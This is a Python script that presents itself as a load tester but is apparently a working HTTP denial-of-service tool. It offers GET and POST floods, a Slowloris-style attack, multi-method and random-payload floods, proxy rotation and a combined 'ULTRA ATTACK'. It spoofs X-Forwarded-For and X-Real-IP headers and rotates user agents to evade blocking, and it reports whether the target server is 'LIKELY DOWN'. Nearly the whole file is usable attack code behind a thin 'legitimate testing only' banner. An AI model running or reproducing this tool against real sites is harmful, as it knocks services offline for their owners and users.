import asyncio
import aiohttp
import random
import time
import json
import sys
import os
from datetime import datetime
from typing import Dict, List, Optional
import socket
import ssl

# Try to import colorama, fallback if not installed
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    # Fallback if colorama not installed
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        RESET = '\033[0m'
    class Style:
        BRIGHT = '\033[1m'
        DIM = '\033[2m'
        NORMAL = '\033[22m'

class LoadTester:
    def __init__(self):
        self.url = ""
        self.concurrent_requests = 100
        self.duration = 30
        self.results = {}
        self.start_time = 0
        self.running = False
        self.power_mode = False  # New: Power mode toggle
        
        # New: Expanded user agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ]
        
        # New: Random paths
        self.paths = [
            '/', '/api', '/test', '/data', '/users', 
            '/info', '/ping', '/status', '/health',
            '/images', '/css', '/js', '/assets', '/v1',
            '/api/v1', '/api/v2', '/graphql', '/rest'
        ]
        
        # New: Query parameters
        self.query_params = [
            '?id={}'.format, '?page={}'.format, '?sort=asc', '?limit=100',
            '?callback=jsonp', '?format=json', '?version=1', '?timestamp={}'.format
        ]
        
        # New: Attack methods
        self.attack_methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH']
    
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        """Display cool banner"""
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
{Fore.CYAN}║                                                          ║
{Fore.CYAN}║  {Fore.YELLOW}███████╗████████╗██████╗ ███████╗███████╗███████╗{Fore.CYAN}  ║
{Fore.CYAN}║  {Fore.YELLOW}██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝{Fore.CYAN}  ║
{Fore.CYAN}║  {Fore.YELLOW}███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗{Fore.CYAN}  ║
{Fore.CYAN}║  {Fore.YELLOW}╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║{Fore.CYAN}  ║
{Fore.CYAN}║  {Fore.YELLOW}███████║   ██║   ██║  ██║███████╗███████║███████║{Fore.CYAN}  ║
{Fore.CYAN}║  {Fore.YELLOW}╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝{Fore.CYAN}  ║
{Fore.CYAN}║                                                          ║
{Fore.CYAN}║     {Fore.GREEN}ULTRA POWER LOAD TESTING v4.0 🚀{Fore.CYAN}              ║
{Fore.CYAN}║     {Fore.RED}⚠️  FOR LEGITIMATE TESTING ONLY ⚠️{Fore.CYAN}          ║
{Fore.CYAN}║     {Fore.MAGENTA}⚡ POWER MODE: {Fore.WHITE}{'ON' if self.power_mode else 'OFF'}{Fore.CYAN}                 ║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝
{Fore.RESET}
"""
        print(banner)
    
    def show_menu(self):
        """Display main menu"""
        self.clear_screen()
        self.print_banner()
        
        menu = f"""
{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.CYAN}  📋 MAIN MENU
{Fore.YELLOW}═══════════════════════════════════════════════════════════════

{Fore.GREEN}  [1] {Fore.WHITE}HTTP GET Flood Attack (Basic)
{Fore.GREEN}  [2] {Fore.WHITE}HTTP POST Flood Attack
{Fore.GREEN}  [3] {Fore.WHITE}Slowloris Style Attack
{Fore.GREEN}  [4] {Fore.WHITE}Multi-Method Attack (Multiple HTTP Methods)
{Fore.GREEN}  [5] {Fore.WHITE}Random Payload Attack
{Fore.GREEN}  [6] {Fore.WHITE}Load Testing Mode
{Fore.GREEN}  [7] {Fore.WHITE}Stress Test with Proxy Rotation
{Fore.GREEN}  [8] {Fore.WHITE}Custom Configuration
{Fore.GREEN}  [9] {Fore.WHITE}View Results

{Fore.MAGENTA}  [P] {Fore.WHITE}Toggle POWER MODE ({'ON' if self.power_mode else 'OFF'})
{Fore.CYAN}  [X] {Fore.WHITE}ULTRA ATTACK - All Methods Combined

{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.CYAN}  [0] {Fore.WHITE}Exit

{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.CYAN}  Enter your choice: {Fore.WHITE}"""
        
        return input(menu)
    
    async def send_request(self, session, method="GET", payload=None, use_random_path=False):
        """Enhanced HTTP request with random paths"""
        # Generate random path if enabled
        path = ""
        if use_random_path:
            path = random.choice(self.paths)
            # Add random query parameters
            if random.random() > 0.5:
                param = random.choice(self.query_params)
                if '{}' in param:
                    path += param(random.randint(1, 9999))
                else:
                    path += param
        
        # Build headers with random User-Agent
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'en;q=0.7']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': random.choice(['keep-alive', 'close']),
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # Add random IP for X-Forwarded-For
        if random.random() > 0.3:
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers['X-Real-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        # Add random referer
        referers = ['https://google.com', 'https://bing.com', 'https://yahoo.com', 'https://duckduckgo.com']
        headers['Referer'] = random.choice(referers)
        
        # Build URL
        full_url = self.url.rstrip('/') + path
        
        start_time = time.time()
        try:
            # Set timeout based on power mode
            timeout_val = 3 if self.power_mode else 10
            timeout = aiohttp.ClientTimeout(total=timeout_val, connect=timeout_val/2)
            
            if method == "GET":
                async with session.get(full_url, headers=headers, timeout=timeout) as response:
                    response_time = time.time() - start_time
                    await response.text()
                    return response.status, response_time, None
                    
            elif method == "POST":
                data = payload or {"data": f"test_{random.randint(1,10000)}", "timestamp": time.time()}
                async with session.post(full_url, headers=headers, json=data, timeout=timeout) as response:
                    response_time = time.time() - start_time
                    await response.text()
                    return response.status, response_time, None
                    
            elif method == "HEAD":
                async with session.head(full_url, headers=headers, timeout=timeout) as response:
                    response_time = time.time() - start_time
                    return response.status, response_time, None
                    
            elif method in ["PUT", "DELETE", "OPTIONS", "PATCH"]:
                data = {"action": method.lower(), "timestamp": time.time()}
                async with session.request(method, full_url, headers=headers, json=data, timeout=timeout) as response:
                    response_time = time.time() - start_time
                    await response.text()
                    return response.status, response_time, None
                    
            else:
                return None, 0, "Invalid method"
                
        except asyncio.TimeoutError:
            return None, 5.0, "Timeout"
        except aiohttp.ClientError as e:
            return None, 0, str(e)
        except Exception as e:
            return None, 0, str(e)
    
    async def ultra_attack(self):
        """ULTRA POWER ATTACK - Combines all methods"""
        self.start_time = time.time()
        print(f"\n{Fore.MAGENTA}⚡⚡⚡ ULTRA POWER ATTACK ACTIVATED ⚡⚡⚡")
        print(f"{Fore.CYAN}🎯 Target: {self.url}")
        print(f"{Fore.CYAN}💪 Mode: {'POWER' if self.power_mode else 'NORMAL'}")
        print(f"{Fore.CYAN}📊 Concurrent: {self.concurrent_requests}")
        print(f"{Fore.CYAN}⏱️  Duration: {self.duration}s\n")
        
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        # Create a TCP connector with more connections
        connector = aiohttp.TCPConnector(
            limit=0,  # No limit
            limit_per_host=0,
            ttl_dns_cache=300,
            force_close=True  # Force close connections after use
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            request_count = 0
            
            while time.time() - self.start_time < self.duration:
                # In power mode, create more tasks
                batch_size = self.concurrent_requests * 2 if self.power_mode else self.concurrent_requests
                
                for _ in range(batch_size):
                    # Randomize attack parameters
                    method = random.choice(self.attack_methods)
                    use_path = random.random() > 0.3
                    
                    # Random payload for POST/PUT/PATCH
                    payload = None
                    if method in ["POST", "PUT", "PATCH"]:
                        payload = {
                            "id": random.randint(1, 99999),
                            "data": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 500))),
                            "timestamp": time.time(),
                            "random": random.random(),
                            "array": [random.randint(1, 100) for _ in range(random.randint(1, 10))]
                        }
                    
                    task = asyncio.create_task(
                        self.send_request(session, method, payload, use_path)
                    )
                    tasks.append(task)
                    request_count += 1
                
                # Execute all tasks
                if tasks:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    for result in results:
                        if isinstance(result, Exception):
                            self.results['failed'] += 1
                        elif result and result[0]:
                            self.results['success'] += 1
                            self.results['response_times'].append(result[1])
                        else:
                            self.results['failed'] += 1
                    
                    tasks = []
                
                # Show progress with more details
                elapsed = int(time.time() - self.start_time)
                total = self.results['success'] + self.results['failed']
                rate = (self.results['success'] / total * 100) if total > 0 else 0
                
                # Dynamic progress bar
                bar_length = 30
                progress = min(elapsed / self.duration, 1.0)
                filled = int(bar_length * progress)
                bar = '█' * filled + '░' * (bar_length - filled)
                
                print(f"\r[{bar}] {elapsed}/{self.duration}s | "
                      f"✅ {self.results['success']:,} | "
                      f"❌ {self.results['failed']:,} | "
                      f"📊 {rate:.1f}% | "
                      f"🚀 {request_count:,} total", end='')
                
                # Small delay to prevent CPU overload
                await asyncio.sleep(0.001)
        
        self.show_attack_results()
    
    async def attack_http_get(self):
        """HTTP GET Flood Attack (Enhanced)"""
        self.start_time = time.time()
        print(f"\n{Fore.GREEN}▶ Starting HTTP GET Flood Attack on {self.url}")
        print(f"{Fore.CYAN}   Concurrent: {self.concurrent_requests} | Duration: {self.duration}s")
        print(f"{Fore.CYAN}   Power Mode: {'ON' if self.power_mode else 'OFF'}\n")
        
        await self.execute_attack("GET")
    
    async def attack_http_post(self):
        """HTTP POST Flood Attack"""
        self.start_time = time.time()
        print(f"\n{Fore.GREEN}▶ Starting HTTP POST Flood Attack on {self.url}")
        print(f"{Fore.CYAN}   Concurrent: {self.concurrent_requests} | Duration: {self.duration}s")
        print(f"{Fore.CYAN}   Power Mode: {'ON' if self.power_mode else 'OFF'}\n")
        
        await self.execute_attack("POST")
    
    async def attack_slowloris(self):
        """Slowloris Style Attack - Enhanced"""
        self.start_time = time.time()
        print(f"\n{Fore.GREEN}▶ Starting Slowloris Style Attack on {self.url}")
        print(f"{Fore.CYAN}   Keeping connections open with slow headers...\n")
        
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        # Increase connections in power mode
        max_connections = 500 if self.power_mode else 200
        
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(min(self.concurrent_requests, max_connections)):
                task = asyncio.create_task(self.slowloris_connection(session, i))
                tasks.append(task)
            
            await asyncio.sleep(self.duration)
            for task in tasks:
                task.cancel()
            
            print(f"\n{Fore.GREEN}✅ Slowloris attack completed!")
            self.show_attack_results()
    
    async def slowloris_connection(self, session, idx):
        """Simulate slowloris attack - Enhanced"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml',
        }
        
        try:
            async with session.get(self.url, headers=headers, timeout=30) as response:
                # Simulate slow reading
                await asyncio.sleep(random.uniform(0.5, 2))
                async for chunk in response.content.iter_chunks():
                    await asyncio.sleep(random.uniform(0.2, 1))
                    break
                self.results['success'] += 1
        except:
            self.results['failed'] += 1
    
    async def attack_multi_method(self):
        """Multi-method attack - Enhanced"""
        self.start_time = time.time()
        print(f"\n{Fore.GREEN}▶ Starting Multi-Method Attack on {self.url}")
        print(f"{Fore.CYAN}   Using all HTTP methods with random paths...\n")
        
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        connector = aiohttp.TCPConnector(limit=0, force_close=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            request_count = 0
            
            while time.time() - self.start_time < self.duration:
                batch_size = self.concurrent_requests * 2 if self.power_mode else self.concurrent_requests
                
                for _ in range(batch_size):
                    method = random.choice(self.attack_methods)
                    use_path = random.random() > 0.3
                    payload = None
                    
                    if method in ["POST", "PUT", "PATCH"]:
                        payload = {"data": f"payload_{random.randint(1,9999)}", "timestamp": time.time()}
                    
                    task = asyncio.create_task(
                        self.send_request(session, method, payload, use_path)
                    )
                    tasks.append(task)
                    request_count += 1
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception):
                        self.results['failed'] += 1
                    elif result and result[0]:
                        self.results['success'] += 1
                        self.results['response_times'].append(result[1])
                    else:
                        self.results['failed'] += 1
                
                tasks = []
                
                elapsed = int(time.time() - self.start_time)
                print(f"⏳ Progress: {elapsed}/{self.duration}s | Success: {self.results['success']} | Failed: {self.results['failed']}", end='\r')
        
        self.show_attack_results()
    
    async def attack_random_payload(self):
        """Random payload attack - Enhanced"""
        self.start_time = time.time()
        print(f"\n{Fore.GREEN}▶ Starting Random Payload Attack on {self.url}")
        print(f"{Fore.CYAN}   Sending random data payloads...\n")
        
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        connector = aiohttp.TCPConnector(limit=0, force_close=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            request_count = 0
            
            while time.time() - self.start_time < self.duration:
                batch_size = self.concurrent_requests * 2 if self.power_mode else self.concurrent_requests
                
                for _ in range(batch_size):
                    # Generate random payload
                    payload = {
                        "id": random.randint(1, 99999),
                        "data": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 500))),
                        "timestamp": time.time(),
                        "random": random.random(),
                        "user": f"user_{random.randint(1, 9999)}",
                        "session": ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))
                    }
                    task = asyncio.create_task(
                        self.send_request(session, "POST", payload, True)
                    )
                    tasks.append(task)
                    request_count += 1
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception):
                        self.results['failed'] += 1
                    elif result and result[0]:
                        self.results['success'] += 1
                        self.results['response_times'].append(result[1])
                    else:
                        self.results['failed'] += 1
                
                tasks = []
                
                elapsed = int(time.time() - self.start_time)
                print(f"⏳ Progress: {elapsed}/{self.duration}s | Success: {self.results['success']} | Failed: {self.results['failed']}", end='\r')
        
        self.show_attack_results()
    
    async def attack_with_proxies(self):
        """Attack with proxy rotation - Enhanced"""
        self.start_time = time.time()
        
        # Try to load proxies from file
        proxies = []
        try:
            if os.path.exists('proxies.txt'):
                with open('proxies.txt', 'r') as f:
                    proxies = [line.strip() for line in f if line.strip()]
        except:
            pass
        
        if not proxies:
            proxies = [
                "http://proxy1:8080",
                "http://proxy2:8080",
                "http://proxy3:8080",
            ]
            print(f"\n{Fore.YELLOW}⚠️  No proxies found. Using default list.\n")
        
        print(f"\n{Fore.GREEN}▶ Starting Attack with Proxy Rotation")
        print(f"{Fore.CYAN}   Using {len(proxies)} proxies...\n")
        
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        connector = aiohttp.TCPConnector(limit=0, force_close=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            request_count = 0
            
            while time.time() - self.start_time < self.duration:
                batch_size = self.concurrent_requests * 2 if self.power_mode else self.concurrent_requests
                
                for _ in range(batch_size):
                    proxy = random.choice(proxies) if proxies else None
                    method = random.choice(['GET', 'POST', 'HEAD'])
                    task = asyncio.create_task(
                        self.send_request_with_proxy(session, proxy, method)
                    )
                    tasks.append(task)
                    request_count += 1
                
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks = []
                
                elapsed = int(time.time() - self.start_time)
                print(f"⏳ Progress: {elapsed}/{self.duration}s | Success: {self.results.get('success', 0)} | Failed: {self.results.get('failed', 0)}", end='\r')
        
        self.show_attack_results()
    
    async def send_request_with_proxy(self, session, proxy, method="GET"):
        """Send request through proxy - Enhanced"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        
        try:
            if proxy:
                async with session.request(method, self.url, headers=headers, proxy=proxy, timeout=5) as response:
                    await response.text()
                    self.results['success'] = self.results.get('success', 0) + 1
            else:
                async with session.request(method, self.url, headers=headers, timeout=5) as response:
                    await response.text()
                    self.results['success'] = self.results.get('success', 0) + 1
        except:
            self.results['failed'] = self.results.get('failed', 0) + 1
    
    async def execute_attack(self, method="GET"):
        """Generic attack executor - Enhanced"""
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        connector = aiohttp.TCPConnector(limit=0, force_close=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            request_count = 0
            
            while time.time() - self.start_time < self.duration:
                batch_size = self.concurrent_requests * 2 if self.power_mode else self.concurrent_requests
                
                for _ in range(batch_size):
                    use_path = random.random() > 0.3
                    task = asyncio.create_task(
                        self.send_request(session, method, None, use_path)
                    )
                    tasks.append(task)
                    request_count += 1
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception):
                        self.results['failed'] += 1
                    elif result and result[0]:
                        self.results['success'] += 1
                        self.results['response_times'].append(result[1])
                    else:
                        self.results['failed'] += 1
                
                tasks = []
                
                elapsed = int(time.time() - self.start_time)
                total = self.results['success'] + self.results['failed']
                rate = (self.results['success'] / total * 100) if total > 0 else 0
                
                print(f"⏳ Progress: {elapsed}/{self.duration}s | "
                      f"✅ {self.results['success']:,} | "
                      f"❌ {self.results['failed']:,} | "
                      f"📊 {rate:.1f}%", end='\r')
        
        self.show_attack_results()
    
    def show_attack_results(self):
        """Display attack results - Enhanced"""
        total = self.results.get('success', 0) + self.results.get('failed', 0)
        
        if total == 0:
            print(f"\n\n{Fore.YELLOW}⚠️  No requests completed.")
            return
        
        print(f"\n\n{Fore.YELLOW}═══════════════════════════════════════════════════════════════")
        print(f"{Fore.CYAN}  📊 ATTACK RESULTS")
        print(f"{Fore.YELLOW}═══════════════════════════════════════════════════════════════")
        print(f"{Fore.GREEN}✅ Successful Requests: {self.results.get('success', 0):,}")
        print(f"{Fore.RED}❌ Failed Requests: {self.results.get('failed', 0):,}")
        print(f"{Fore.WHITE}📊 Total Requests: {total:,}")
        
        success_rate = (self.results.get('success', 0) / total * 100) if total > 0 else 0
        print(f"{Fore.WHITE}📊 Success Rate: {success_rate:.2f}%")
        
        # Server status assessment
        print(f"\n{Fore.CYAN}🖥️  SERVER STATUS:")
        if success_rate > 80:
            print(f"   {Fore.GREEN}🟢 Server is HEALTHY and responding well")
        elif success_rate > 50:
            print(f"   {Fore.YELLOW}🟡 Server is STRUGGLING but still online")
        elif success_rate > 20:
            print(f"   {Fore.MAGENTA}🟠 Server is UNDER STRESS!")
        else:
            print(f"   {Fore.RED}🔴 Server is LIKELY DOWN or UNRESPONSIVE!")
        
        response_times = self.results.get('response_times', [])
        if response_times:
            print(f"\n{Fore.CYAN}⚡ RESPONSE TIMES:")
            print(f"{Fore.WHITE}   Average: {sum(response_times)/len(response_times):.3f}s")
            print(f"{Fore.WHITE}   Min: {min(response_times):.3f}s")
            print(f"{Fore.WHITE}   Max: {max(response_times):.3f}s")
            
            sorted_times = sorted(response_times)
            p95 = sorted_times[int(len(sorted_times) * 0.95)] if len(sorted_times) > 0 else 0
            print(f"{Fore.WHITE}   95th Percentile: {p95:.3f}s")
            
            # Response time status
            avg_time = sum(response_times)/len(response_times)
            if avg_time < 0.5:
                print(f"   {Fore.GREEN}⚡ Very fast responses!")
            elif avg_time < 1.0:
                print(f"   {Fore.YELLOW}⚡ Normal response times")
            elif avg_time < 2.0:
                print(f"   {Fore.MAGENTA}⚡ Slow responses - Server under load")
            else:
                print(f"   {Fore.RED}⚡ Very slow responses - Server struggling!")
        else:
            print(f"\n{Fore.YELLOW}⚠️  No response time data available.")
        
        print(f"{Fore.YELLOW}═══════════════════════════════════════════════════════════════\n")
        input(f"{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")
    
    async def load_test_mode(self):
        """Comprehensive load testing - Enhanced"""
        print(f"\n{Fore.GREEN}▶ Starting Comprehensive Load Test")
        print(f"{Fore.CYAN}   This will test multiple aspects of the server...\n")
        
        concurrency_levels = [10, 50, 100, 200, 500] if self.power_mode else [10, 50, 100, 200]
        
        all_results = []
        for level in concurrency_levels:
            print(f"\n{Fore.YELLOW}Testing with {level} concurrent requests...")
            self.concurrent_requests = level
            self.duration = 15
            self.start_time = time.time()
            await self.execute_attack("GET")
            
            result_copy = self.results.copy()
            result_copy['concurrency'] = level
            all_results.append(result_copy)
            
            await asyncio.sleep(2)
        
        filename = f"load_test_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        data = {
            "timestamp": datetime.now().isoformat(),
            "url": self.url,
            "power_mode": self.power_mode,
            "tests": all_results
        }
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"\n{Fore.GREEN}📁 Full results saved to: {filename}")
    
    def custom_configuration(self):
        """Custom configuration menu - Enhanced"""
        self.clear_screen()
        print(f"\n{Fore.YELLOW}═══════════════════════════════════════════════════════════════")
        print(f"{Fore.CYAN}  ⚙️  CUSTOM CONFIGURATION")
        print(f"{Fore.YELLOW}═══════════════════════════════════════════════════════════════")
        
        print(f"\n{Fore.WHITE}Current Configuration:")
        print(f"  {Fore.CYAN}URL: {Fore.WHITE}{self.url or 'Not Set'}")
        print(f"  {Fore.CYAN}Concurrent Requests: {Fore.WHITE}{self.concurrent_requests}")
        print(f"  {Fore.CYAN}Duration (seconds): {Fore.WHITE}{self.duration}")
        print(f"  {Fore.CYAN}Power Mode: {Fore.WHITE}{'ON' if self.power_mode else 'OFF'}")
        
        print(f"\n{Fore.GREEN}Enter new values (press Enter to keep current):")
        
        url_input = input(f"{Fore.CYAN}Target URL: {Fore.WHITE}")
        if url_input:
            self.url = url_input
        
        conc_input = input(f"{Fore.CYAN}Concurrent Requests [{self.concurrent_requests}]: {Fore.WHITE}")
        if conc_input and conc_input.isdigit():
            self.concurrent_requests = int(conc_input)
        
        dur_input = input(f"{Fore.CYAN}Duration (seconds) [{self.duration}]: {Fore.WHITE}")
        if dur_input and dur_input.isdigit():
            self.duration = int(dur_input)
        
        print(f"\n{Fore.GREEN}✅ Configuration updated!")
        input(f"\n{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")
    
    def toggle_power_mode(self):
        """Toggle power mode on/off"""
        self.power_mode = not self.power_mode
        print(f"\n{Fore.MAGENTA}⚡ POWER MODE: {'ON' if self.power_mode else 'OFF'}")
        if self.power_mode:
            print(f"{Fore.CYAN}   • Double concurrent requests")
            print(f"{Fore.CYAN}   • Faster timeouts")
            print(f"{Fore.CYAN}   • Force close connections")
            print(f"{Fore.CYAN}   • More aggressive attack")
        else:
            print(f"{Fore.CYAN}   • Normal mode")
            print(f"{Fore.CYAN}   • Standard timeouts")
            print(f"{Fore.CYAN}   • Keep connections open")
        
        input(f"\n{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")
    
    async def run(self):
        """Main application loop"""
        while True:
            choice = self.show_menu()
            
            if not self.url:
                self.url = "http://localhost:8080"
                print(f"\n{Fore.YELLOW}⚠️  No target URL set. Using default: {self.url}")
                print(f"{Fore.YELLOW}   Please configure in Custom Configuration (Option 8)")
                input(f"\n{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")
                continue
            
            try:
                if choice == "1":
                    await self.attack_http_get()
                elif choice == "2":
                    await self.attack_http_post()
                elif choice == "3":
                    await self.attack_slowloris()
                elif choice == "4":
                    await self.attack_multi_method()
                elif choice == "5":
                    await self.attack_random_payload()
                elif choice == "6":
                    await self.load_test_mode()
                elif choice == "7":
                    await self.attack_with_proxies()
                elif choice == "8":
                    self.custom_configuration()
                elif choice == "9":
                    if self.results and self.results.get('success', 0) + self.results.get('failed', 0) > 0:
                        self.show_attack_results()
                    else:
                        print(f"\n{Fore.YELLOW}⚠️  No results to display. Run an attack first.")
                        input(f"\n{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")
                elif choice.upper() == "P":
                    self.toggle_power_mode()
                elif choice.upper() == "X":
                    await self.ultra_attack()
                elif choice == "0":
                    print(f"\n{Fore.GREEN}👋 Goodbye!")
                    sys.exit()
                else:
                    print(f"\n{Fore.RED}❌ Invalid choice. Please try again.")
                    input(f"\n{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")
                    
            except Exception as e:
                print(f"\n{Fore.RED}❌ Error: {str(e)}")
                print(f"{Fore.YELLOW}   Check your target URL and try again.")
                input(f"\n{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")

# Main entry point
async def main():
    tester = LoadTester()
    await tester.run()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}⏹️  Program terminated by user.")
        sys.exit()
    except Exception as e:
        print(f"\n{Fore.RED}❌ Fatal Error: {str(e)}")
        sys.exit()